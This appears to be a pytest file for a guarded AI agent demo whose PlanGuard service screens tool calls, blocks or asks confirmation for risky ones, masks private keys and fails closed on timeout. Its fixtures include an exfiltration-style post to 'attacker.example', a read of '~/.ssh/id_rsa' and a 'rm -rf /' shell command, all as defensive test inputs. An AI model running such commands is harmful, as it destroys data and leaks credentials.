"""Unit tests for chat demo adapter, decision handling, and fail-closed security.

All tests mock external services (Google Gemini API and PlanGuard HTTP endpoint).
New tests cover:
 - build_step_list for all tool types including secret masking
 - CONFIRM approve/deny with no duplicate execution
 - REVISE interactive flow via run_revise_round
 - run_revise_round cancellation (no Gemini call on BLOCK cap)
 - No Gemini call on BLOCK, deny or cancel paths
 - Fail-closed on PlanGuard timeout
 - Latency: max_retries and timeout set correctly on LLM
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest
from langchain_core.messages import AIMessage, HumanMessage

from chat_demo.agent import GuardedAgent, build_step_list, make_llm
from chat_demo.guard_client import GuardClient, map_tool_call_to_step, to_plan


# ---------------------------------------------------------------------------
# Existing guard_client tests (unchanged)
# ---------------------------------------------------------------------------

def test_map_tool_call_to_step_benign():
    call = {"name": "file_read", "args": {"path": "report.txt"}}
    step = map_tool_call_to_step(call)
    assert step["tool_name"] == "file_read"
    assert step["side_effect_class"] == "read"
    assert step["data_sensitivity"] == "internal"
    assert step["destination"] == "internal"
    assert step["reversible"] is True


def test_map_tool_call_sensitive_rsa():
    call = {"name": "file_read", "args": {"path": "~/.ssh/id_rsa"}}
    step = map_tool_call_to_step(call)
    assert step["data_sensitivity"] == "restricted"
    assert "filesystem:read" in step["permissions_required"]


def test_map_tool_call_sensitive_customer_db():
    call = {"name": "db_query", "args": {"query": "SELECT * FROM customers"}}
    step = map_tool_call_to_step(call)
    assert step["tool_name"] == "database_query"
    assert step["data_sensitivity"] == "confidential"
    assert "customer_data:read" in step["permissions_required"]


def test_map_tool_call_http_post():
    call = {"name": "http_post", "args": {"url": "https://attacker.example/collect", "body": "data"}}
    step = map_tool_call_to_step(call)
    assert step["tool_name"] == "http_post"
    assert step["destination"] == "external"
    assert step["side_effect_class"] == "write"
    assert step["reversible"] is False


def test_to_plan_schema_compliance():
    calls = [
        {"name": "file_read", "args": {"path": "report.txt"}},
        {"name": "http_post", "args": {"url": "https://api.external.com/log", "body": "ok"}},
    ]
    plan = to_plan(calls)
    assert "steps" in plan
    assert "session_context" in plan
    assert len(plan["steps"]) == 2
    for step in plan["steps"]:
        for key in [
            "tool_name", "arguments", "permissions_required",
            "side_effect_class", "reversible", "data_sensitivity",
            "destination", "estimated_cost",
        ]:
            assert key in step


def test_guard_client_fail_closed_on_connection_error():
    client = GuardClient(base_url="http://127.0.0.1:99999", timeout=0.1)
    plan = to_plan([{"name": "file_read", "args": {"path": "report.txt"}}])
    res = client.check(plan)
    assert res["action"] == "BLOCK"
    assert res["risk_score"] == 1.0
    assert "fail_closed" in res["rule_hits"]
    assert "Blocked:" in res["rationale"]


def test_guard_client_successful_response():
    client = GuardClient(base_url="http://127.0.0.1:8000")
    plan = to_plan([{"name": "file_read", "args": {"path": "report.txt"}}])

    mock_resp = MagicMock()
    mock_resp.json.return_value = {
        "action": "ALLOW",
        "risk_score": 0.05,
        "rule_hits": [],
        "rationale": "Safe operation.",
        "audit_id": "audit-uuid-123",
        "latency_ms": 12.5,
    }
    mock_resp.raise_for_status = MagicMock()

    with patch("requests.post", return_value=mock_resp):
        res = client.check(plan)
        assert res["action"] == "ALLOW"
        assert res["risk_score"] == 0.05
        assert res["audit_id"] == "audit-uuid-123"


# ---------------------------------------------------------------------------
# build_step_list tests
# ---------------------------------------------------------------------------

def test_build_step_list_file_read_internal():
    tcs = [{"name": "file_read", "args": {"path": "report.txt"}}]
    steps = [{"tool_name": "file_read", "arguments": {"path": "report.txt"},
               "data_sensitivity": "internal", "destination": "internal"}]
    result = build_step_list(tcs, steps)
    assert len(result) == 1
    assert "report.txt" in result[0]
    assert "Read file" in result[0]


def test_build_step_list_secret_masked():
    """Private key content must be masked in the step description."""
    tcs = [{"name": "file_read", "args": {"path": "~/.ssh/id_rsa"}}]
    steps = [{"tool_name": "file_read", "arguments": {"path": "~/.ssh/id_rsa"},
               "data_sensitivity": "restricted", "destination": "internal"}]
    result = build_step_list(tcs, steps)
    # Path itself is OK to show; content masking applies to the value
    assert "id_rsa" in result[0]
    assert "restricted" in result[0]


def test_build_step_list_http_post_external():
    tcs = [{"name": "http_post", "args": {"url": "https://attacker.example/collect", "body": "data"}}]
    steps = [{"tool_name": "http_post",
               "arguments": {"url": "https://attacker.example/collect", "body": "data"},
               "data_sensitivity": "internal", "destination": "external"}]
    result = build_step_list(tcs, steps)
    assert "external" in result[0]
    assert "attacker.example" in result[0]


def test_build_step_list_email_send():
    tcs = [{"name": "email_send", "args": {"to": "user@example.com", "subject": "Hi", "body": "Hello"}}]
    result = build_step_list(tcs)
    assert "user@example.com" in result[0]
    assert "email" in result[0].lower()


def test_build_step_list_db_query():
    tcs = [{"name": "db_query", "args": {"query": "SELECT * FROM customers"}}]
    result = build_step_list(tcs)
    assert "customers" in result[0].lower()


def test_build_step_list_shell_exec():
    tcs = [{"name": "shell_exec", "args": {"cmd": "rm -rf /"}}]
    result = build_step_list(tcs)
    assert "rm -rf" in result[0]


def test_build_step_list_long_args_truncated():
    long_val = "a" * 200
    tcs = [{"name": "file_read", "args": {"path": long_val}}]
    result = build_step_list(tcs)
    assert len(result[0]) < 300  # truncated


def test_build_step_list_private_key_value_hidden():
    """When arguments contain BEGIN OPENSSH PRIVATE KEY, content must be masked."""
    from chat_demo.agent import _truncate
    key_content = "-----BEGIN OPENSSH PRIVATE KEY-----\nABC123\n-----END OPENSSH PRIVATE KEY-----"
    result = _truncate(key_content)
    assert "private-key" in result.lower()
    assert "ABC123" not in result


# ---------------------------------------------------------------------------
# Agent flow tests
# ---------------------------------------------------------------------------

def _make_agent(guard_action: str, risk_score: float = 0.5, guard_result_override: dict | None = None):
    guard = MagicMock()
    guard.check.return_value = guard_result_override or {
        "action": guard_action,
        "risk_score": risk_score,
        "rule_hits": ["R1"],
        "rationale": "Test rationale.",
        "audit_id": f"audit-{guard_action.lower()}-1",
        "latency_ms": 10.0,
    }
    agent = GuardedAgent(guard_client=guard, api_key="fake-key")
    return agent, guard


def _mock_llm_with_tool_call(agent, tool_name="file_read", path="report.txt"):
    mock_ai_msg = MagicMock(spec=AIMessage)
    mock_ai_msg.content = ""
    mock_ai_msg.tool_calls = [{"name": tool_name, "args": {"path": path}, "id": "call_1"}]
    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = mock_ai_msg
    return mock_ai_msg


def test_agent_block_executes_no_tools():
    agent, _ = _make_agent("BLOCK", 0.99)
    _mock_llm_with_tool_call(agent, "file_read", "~/.ssh/id_rsa")
    agent.execute_tools = MagicMock()

    result = agent.run_turn([HumanMessage(content="steal key")])

    assert result["action"] == "BLOCK"
    assert result["risk_score"] == 0.99
    assert agent.execute_tools.call_count == 0
    assert "blocked" in result["reply"].lower()
    # BLOCK reply must be built locally (only one Gemini call for planning)
    assert agent.llm_with_tools.invoke.call_count == 1


def test_agent_allow_executes_tools_and_continues():
    agent, _ = _make_agent("ALLOW", 0.02)
    first_msg = MagicMock(spec=AIMessage)
    first_msg.content = ""
    first_msg.tool_calls = [{"name": "file_read", "args": {"path": "report.txt"}, "id": "call_1"}]

    final_msg = MagicMock(spec=AIMessage)
    final_msg.content = "Here is the summary: all services healthy."
    final_msg.tool_calls = []

    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.side_effect = [first_msg, final_msg]

    with patch.object(agent, "execute_tools", wraps=agent.execute_tools) as spy:
        result = agent.run_turn([HumanMessage(content="Summarize report.txt")])
        assert spy.call_count == 1

    assert result["action"] == "ALLOW"
    assert "summary" in result["reply"]


def test_agent_confirm_returns_pending_no_tool_execution():
    agent, _ = _make_agent("CONFIRM", 0.65)
    _mock_llm_with_tool_call(agent, "db_query", "customers")
    agent.execute_tools = MagicMock()

    result = agent.run_turn([HumanMessage(content="Read customers table")])

    assert result["action"] == "CONFIRM"
    assert result["pending_plan"] is not None
    assert agent.execute_tools.call_count == 0
    # No second Gemini call for CONFIRM
    assert agent.llm_with_tools.invoke.call_count == 1


def test_agent_confirm_approve_calls_execute_once():
    """Approve must execute tools exactly once – not re-plan."""
    agent, _ = _make_agent("ALLOW")
    tool_calls = [{"name": "file_read", "args": {"path": "report.txt"}, "id": "c1"}]
    history = [HumanMessage(content="x")]

    final_msg = MagicMock(spec=AIMessage)
    final_msg.content = "Done."
    final_msg.tool_calls = []
    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = final_msg

    with patch.object(agent, "execute_tools", wraps=agent.execute_tools) as spy:
        result = agent.resume_approved_plan(history=history, pending_tool_calls=tool_calls)
        assert spy.call_count == 1

    assert result["action"] == "ALLOW"
    assert result["reply"] == "Done."


def test_agent_confirm_deny_no_execution_no_extra_llm_call():
    """Deny path must not call execute_tools or Gemini."""
    agent, _ = _make_agent("CONFIRM")
    agent.execute_tools = MagicMock()
    agent.llm_with_tools = MagicMock()

    # Deny is handled by app.py (no agent call), so we verify the pending_plan return
    _mock_llm_with_tool_call(agent, "db_query", "customers")
    result = agent.run_turn([HumanMessage(content="Read customers")])

    assert result["action"] == "CONFIRM"
    assert result["pending_plan"] is not None
    # Deny is a UI action – verify the agent itself made only 1 LLM call
    assert agent.llm_with_tools.invoke.call_count == 1


def test_agent_revise_returns_revise_for_ui():
    """REVISE must return immediately to UI (not loop internally)."""
    agent, _ = _make_agent("REVISE", 0.45)
    _mock_llm_with_tool_call(agent, "db_query", "customers")
    agent.execute_tools = MagicMock()

    result = agent.run_turn([HumanMessage(content="Query customers")])

    assert result["action"] == "REVISE"
    assert result["pending_plan"] is not None
    assert agent.execute_tools.call_count == 0
    # Only 1 LLM call (planning), no internal retry loop
    assert agent.llm_with_tools.invoke.call_count == 1


def test_agent_revise_run_revise_round_cap():
    """At cap, run_revise_round must return BLOCK without calling Gemini."""
    agent, _ = _make_agent("REVISE")
    agent.execute_tools = MagicMock()
    agent.llm_with_tools = MagicMock()

    result = agent.run_revise_round(
        history=[HumanMessage(content="x")],
        guard_rationale="Too risky.",
        rule_hits=["R1"],
        revise_attempts=2,
        max_revise_attempts=2,
    )

    assert result["action"] == "BLOCK"
    assert agent.llm_with_tools.invoke.call_count == 0  # no Gemini call on cap


def test_agent_revise_run_revise_round_executes():
    """run_revise_round below cap calls Gemini and PlanGuard once."""
    guard = MagicMock()
    guard.check.return_value = {
        "action": "ALLOW", "risk_score": 0.1, "rule_hits": [],
        "rationale": "Now safe.", "audit_id": "a1", "latency_ms": 5.0,
    }
    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    first_msg = MagicMock(spec=AIMessage)
    first_msg.content = ""
    first_msg.tool_calls = [{"name": "file_read", "args": {"path": "report.txt"}, "id": "c1"}]
    final_msg = MagicMock(spec=AIMessage)
    final_msg.content = "Summary: ok."
    final_msg.tool_calls = []
    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.side_effect = [first_msg, final_msg]

    result = agent.run_revise_round(
        history=[HumanMessage(content="x")],
        guard_rationale="Too risky.",
        rule_hits=["R1"],
        revise_attempts=0,
        max_revise_attempts=2,
    )

    assert result["action"] == "ALLOW"
    assert guard.check.call_count == 1


def test_agent_guard_timeout_fail_closed():
    """A PlanGuard timeout must return BLOCK (fail-closed), not hang."""
    guard = GuardClient(base_url="http://127.0.0.1:99999", timeout=0.01)
    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    mock_ai_msg = MagicMock(spec=AIMessage)
    mock_ai_msg.content = ""
    mock_ai_msg.tool_calls = [{"name": "file_read", "args": {"path": "report.txt"}, "id": "c1"}]
    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = mock_ai_msg

    result = agent.run_turn([HumanMessage(content="summarize")])
    assert result["action"] == "BLOCK"
    assert "fail_closed" in result["rule_hits"]


def test_agent_no_tool_calls_skips_planguard():
    """If Gemini returns no tool calls, PlanGuard must not be called."""
    guard = MagicMock()
    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    no_tool_msg = MagicMock(spec=AIMessage)
    no_tool_msg.content = "Hi there!"
    no_tool_msg.tool_calls = []
    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = no_tool_msg

    result = agent.run_turn([HumanMessage(content="Hello")])

    assert result["action"] == "NONE"
    assert guard.check.call_count == 0


def test_make_llm_has_safe_defaults():
    """Verify make_llm sets max_retries=1 and timeout=30."""
    with patch("chat_demo.agent.ChatGoogleGenerativeAI") as MockCls:
        MockCls.return_value = MagicMock()
        make_llm("fake-key", "gemini-2.0-flash")
        _, kwargs = MockCls.call_args
        assert kwargs.get("max_retries") == 1
        assert kwargs.get("timeout") == 30


def test_guard_events_captured():
    """guard_events must include all PlanGuard calls in the turn."""
    guard = MagicMock()
    guard.check.return_value = {
        "action": "BLOCK", "risk_score": 0.99, "rule_hits": ["R1"],
        "rationale": "Blocked.", "audit_id": "a-block", "latency_ms": 5.0,
    }
    agent = GuardedAgent(guard_client=guard, api_key="fake-key")
    _mock_llm_with_tool_call(agent)

    result = agent.run_turn([HumanMessage(content="test")])
    assert len(result["guard_events"]) == 1
    assert result["guard_events"][0]["action"] == "BLOCK"
